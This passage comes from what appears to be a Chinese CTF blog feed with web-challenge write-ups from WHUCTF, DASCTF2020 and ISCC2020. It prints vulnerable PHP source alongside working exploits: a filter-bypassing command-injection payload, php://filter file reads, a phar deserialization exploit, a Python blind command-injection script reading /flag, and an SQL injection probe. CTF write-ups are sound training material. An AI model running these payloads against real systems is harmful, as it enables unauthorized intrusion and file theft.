class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">  $ip = $_GET[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, $ip, $match))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, $ip, $match);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, $ip))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no space!&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, $ip))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no flag&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/tac|rm|echo|cat|nl|less|more|tail|head/&quot;</span>, $ip))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;cat&#x27;t read flag&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $a = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.$ip); </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>不知道为啥curl，echo都用不了，payload:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=||a=ca;b=t;<span class="variable">$a</span><span class="variable">$b</span><span class="variable">$IFS</span>`ls`</span><br></pre></td></tr></table></figure><h2 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h2><p>脑洞题，扫目录有：<code>info.php</code>,phpinfo 开了一大堆扩展，立马想到了phpinfo包含临时文件getshell</p><p>找了半天没没找到包含点，最后发现</p><img src="/2020/05/23/WHUCTF-web-wp/TIM截图20200525135648.png" style="zoom:80%;"><p>就很奇怪，直接php://filter就能读flag，奇怪</p><img src="/2020/05/23/WHUCTF-web-wp/TIM截图20200525135923.png" style="zoom:80%;"><h2 id="Easy-unserialize"><a href="#Easy-unserialize" class="headerlink" title="Easy_unserialize"></a>Easy_unserialize</h2><p>我太菜了，抓包可以看到</p><img src="/2020/05/23/WHUCTF-web-wp/TIM截图20200525150148.png" style="zoom: 80%;"><p>html是这样写的：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;acti0n&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;上传图片&quot;</span> <span class="attr">value</span>=<span class="string">&quot;upload&quot;</span> <span class="attr">class</span>=<span class="string">&#x27;btn&#x27;</span> <span class="attr">id</span>=<span class="string">&#x27;b1&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="/2020/05/23/WHUCTF-web-wp/TIM截图20200525150415.png" style="zoom:67%;"><p>自动进行302跳转</p><p>这里存在文件包含的,构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?acti0n=php:<span class="comment">//filter/convert.bAse64-encode/resource=upload.php</span></span><br><span class="line">?acti0n=php:<span class="comment">//filter/string.rot13/resource=upload.php</span></span><br></pre></td></tr></table></figure><p>读到源码upload.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$dir = <span class="string">&#x27;upload/&#x27;</span>.md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]).<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!is_dir($dir)) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!mkdir($dir, <span class="number">0777</span>, <span class="literal">true</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> error_get_last()[<span class="string">&#x27;message&#x27;</span>];</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Failed to make the directory&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">chdir($dir);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    $name = $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    $tmp_name = $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $ans = exif_imagetype($tmp_name);</span><br><span class="line">    <span class="keyword">if</span>($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] &gt;= <span class="number">204800</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;filesize too big.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!$name) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;filename can not be empty!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(htaccess)|(user)|(\.\.)|(%)|(#)/i&#x27;</span>, $name) !== <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Hacker!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(($ans != IMAGETYPE_GIF) &amp;&amp; ($ans != IMAGETYPE_JPEG) &amp;&amp; ($ans != IMAGETYPE_PNG)) &#123;</span><br><span class="line">        $type = $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>($type == <span class="string">&#x27;image/gif&#x27;</span> <span class="keyword">or</span> $type == <span class="string">&#x27;image/jpg&#x27;</span> <span class="keyword">or</span> $type == <span class="string">&#x27;image/png&#x27;</span> <span class="keyword">or</span> $type == <span class="string">&#x27;image/jpeg&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p align=\&quot;center\&quot;&gt;Don&#x27;t cheat me with Content-Type!&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;&lt;p align=\&quot;center\&quot;&gt;You can&#x27;t upload this kind of file!&lt;/p&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $content = file_get_contents($tmp_name);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(scandir)|(end)|(implode)|(eval)|(system)|(passthru)|(exec)|(chroot)|(chgrp)|(chown)|(shell_exec)|(proc_open)|(proc_get_status)|(ini_alter)|(ini_set)|(ini_restore)|(dl)|(pfsockopen)|(symlink)|(popen)|(putenv)|(syslog)|(readlink)|(stream_socket_server)|(error_log)/i&#x27;</span>, $content) !== <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;You could not upload this image because of some dangerous code in your file!&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;       </span><br><span class="line"></span><br><span class="line">    $extension = substr($name, strrpos($name, <span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(png)|(jpg)|(jpeg)|(phar)|(gif)|(txt)|(md)|(exe)/i&#x27;</span>, $extension) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&lt;p align=\&quot;center\&quot;&gt;You can&#x27;t upload this kind of file!&lt;/p&gt;&quot;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    $upload_file = $name;</span><br><span class="line">    move_uploaded_file($tmp_name, $upload_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(file_exists($name)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p align=\&quot;center\&quot;&gt;Your file <span class="subst">$name</span> has been uploaded.&lt;br&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;上传失败&quot;)&lt;/script&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p align=\&quot;center\&quot;&gt;&lt;a href=\&quot;view.php\&quot; &gt;点我去看上传的文件&lt;/a&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="comment">#header(&quot;refresh:3;url=index.php&quot;);</span></span><br><span class="line">&#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>view.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#include_once &quot;flag.php&quot;; </span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">View</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $dir;</span><br><span class="line">    <span class="keyword">private</span> $cmd;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;dir = <span class="string">&#x27;upload/&#x27;</span>.md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]).<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = <span class="string">&#x27;echo &quot;&lt;div style=\&quot;text-align: center;position: absolute;left: 0;bottom: 0;width: 100%;height: 30px;\&quot;&gt;Powered by: xxx&lt;/div&gt;&quot;;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(!is_dir(<span class="keyword">$this</span>-&gt;dir)) &#123;</span><br><span class="line">            mkdir(<span class="keyword">$this</span>-&gt;dir, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_file_list</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $file = scandir(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show_file_list</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $file = <span class="keyword">$this</span>-&gt;get_file_list();</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">2</span>; $i &lt; sizeof($file); $i++) &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p align=\&quot;center\&quot; style=\&quot;font-weight: bold;\&quot;&gt;[&quot;</span>.strval($i - <span class="number">1</span>).<span class="string">&quot;]  <span class="subst">$file</span>[<span class="subst">$i</span>] &lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show_img</span>(<span class="params">$file_name</span>) </span>&#123;</span><br><span class="line">        $name = $file_name;</span><br><span class="line">        $width = getimagesize($name)[<span class="number">0</span>];</span><br><span class="line">        $height = getimagesize($name)[<span class="number">1</span>];</span><br><span class="line">        $times = $width / <span class="number">200</span>;</span><br><span class="line">        $width /= $times;</span><br><span class="line">        $height /= $times;</span><br><span class="line">        $template = <span class="string">&quot;&lt;img style=\&quot;clear: both;display: block;margin: auto;\&quot; src=\&quot;<span class="subst">$this</span>-&gt;dir<span class="subst">$name</span>\&quot; alt=\&quot;<span class="subst">$file_name</span>\&quot; width = \&quot;<span class="subst">$width</span>\&quot; height = \&quot;<span class="subst">$height</span>\&quot;&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> $template;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">delete_img</span>(<span class="params">$file_name</span>) </span>&#123;</span><br><span class="line">        $name = $file_name;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($name)) &#123;</span><br><span class="line">            @unlink($name);</span><br><span class="line">            <span class="keyword">if</span>(!file_exists($name)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;p align=\&quot;center\&quot; style=\&quot;font-weight: bold;\&quot;&gt;成功删除! 3s后跳转&lt;/p&gt;&quot;</span>;</span><br><span class="line">                header(<span class="string">&quot;refresh:3;url=view.php&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Can not delete!&quot;</span>;</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p align=\&quot;center\&quot; style=\&quot;font-weight: bold;\&quot;&gt;找不到这个文件! &lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ins = <span class="keyword">new</span> View();</span><br><span class="line">chdir($ins-&gt;dir);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3&gt;当前目录为 &quot;</span> . $ins-&gt;dir . <span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line">$ins-&gt;show_file_list();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;show&#x27;</span>])) &#123;</span><br><span class="line">    $file_name = $_POST[<span class="string">&#x27;show&#x27;</span>];</span><br><span class="line">    $ins-&gt;show_img($file_name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;delete&#x27;</span>])) &#123;</span><br><span class="line">    $file_name = $_POST[<span class="string">&#x27;delete&#x27;</span>];</span><br><span class="line">    $ins-&gt;delete_img($file_name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unset</span>($ins);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>不用phar反序列化也能getflag，没过滤assert直接传个马包含</p><p>再看看phar反序列化怎末搞得吧，phar反序列化影响的函数：</p><img src="/2020/05/23/WHUCTF-web-wp/17c4c630-b5f7-4e02-af48-160cd8fcf73a.png" style="zoom:80%;"><p>在delete_img函数里我们看到了file_exists函数，由此，思路很明确，上传phar文件，然后删除文件就能触发反序列化了，构造exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">View</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $dir;</span><br><span class="line">    <span class="keyword">private</span> $cmd=<span class="string">&quot;echo &#x27;ok&#x27;;readfile(&#x27;/var/www/html/flag.php&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$object = <span class="keyword">new</span> View;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;s.phar&quot;</span>); <span class="comment">//后缀名必须为 phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line">$phar-&gt;setMetadata($object); <span class="comment">//将自定义的 meta-data 存入 manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;a&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后上传phar文件，改下后缀为gif,需要用绝对路径，查看源码得到flag</p><img src="/2020/05/23/WHUCTF-web-wp/TIM截图20200525155136.png" style="zoom:80%;">]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF2020 wp</title>
      <link href="2020/05/22/DASCTF2020-wp/"/>
      <url>2020/05/22/DASCTF2020-wp/</url>
      
        <content type="html"><![CDATA[<p>BJDCTF第三届和DASCTF联合举办的比赛！</p><a id="more"></a><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="帮帮小红花"><a href="#帮帮小红花" class="headerlink" title="帮帮小红花"></a>帮帮小红花</h3><p>这题刚开始有非预期，直接写文件就行</p><p>改过之后可以时间盲注爆flag，exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://183.129.189.60:10069/?imagin=&quot;</span></span><br><span class="line">payload1=<span class="string">&quot;sleep $(cat /flag|cut -c &#123;&#125;|tr &#123;&#125; 3)&quot;</span></span><br><span class="line">payload2=<span class="string">&quot;if test $(cat /flag|cut -c &#123;&#125;) = &#123;&#125;;then sleep 3;fi&quot;</span></span><br><span class="line">s=string.ascii_letters+string.digits+<span class="string">&#x27;&#123;@~^*_+&#125;&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    f=flag</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            u=url+urllib.parse.quote(payload1.format(str(i),j))</span><br><span class="line">            r=requests.get(u,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">            flag=flag+j</span><br><span class="line">            print(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f==flag:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="gob"><a href="#gob" class="headerlink" title="gob"></a>gob</h3><p>先测下功能，发现有登陆，但是用什么账号密码都能登陆，应该不是sql注入，</p><p>然后有上传文件的地方，上传什么都不会解析</p><p>还有个展示头像的地方，我们注意到</p><img src="/2020/05/22/DASCTF2020-wp/TIM截图20200523102902.png" style="zoom:50%;"><p>上传文件时我们可以目录穿越，可以上传到上级目录，但是还不会解析，既然上传的内容可以显示出来，我们直接构造到flag那让它读flag不就行了</p><img src="/2020/05/22/DASCTF2020-wp/TIM截图20200523102330.png" style="zoom:80%;"><p>虽然会提示文件存在，但不影响文件读取，直接解码base64加密的结果得到flag</p><h3 id="老开发"><a href="#老开发" class="headerlink" title="老开发"></a>老开发</h3><p>fuzz一下，发现下面可以注入</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&#x27; and 2=&#x27;2&amp;password=admin</span><br></pre></td></tr></table></figure><p>猜测后台sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">&#x27;$username&#x27;</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">&#x27;$password&#x27;</span></span><br></pre></td></tr></table></figure><p>此时注入的就是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> <span class="number">2</span>=<span class="string">&#x27;2&#x27;</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCC2020 writeup</title>
      <link href="2020/05/06/ISCC2020-writeup/"/>
      <url>2020/05/06/ISCC2020-writeup/</url>
      
        <content type="html"><![CDATA[<p>记一下部分题目的writeup吧！</p><a id="more"></a><h2 id="练武题"><a href="#练武题" class="headerlink" title="练武题"></a>练武题</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="阿森的爱情-1"><a href="#阿森的爱情-1" class="headerlink" title="阿森的爱情-1"></a>阿森的爱情-1</h4><p>抓包发现Set-Cookie字段：添加并改成<code>login=1</code></p><p>然后发现</p><img src="/2020/05/06/ISCC2020-writeup/TIM截图20200506215326.png" style="zoom:80%;"><p>解下MD5发现是<code>573495</code>，后来听说flag在readme.txt，不过被删了</p><h4 id="Php-is-the-best-language"><a href="#Php-is-the-best-language" class="headerlink" title="Php is the best language"></a>Php is the best language</h4><p>下载文件给出源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">@error_reporting(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))</span><br><span class="line">        &#123;</span><br><span class="line">            $filename = <span class="string">&quot;./<span class="subst">&#123;$this-&gt;file&#125;</span>&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (base64_encode(file_get_contents($filename)))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> base64_encode(file_get_contents($filename));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;data&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $data = $_GET[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">        $good = 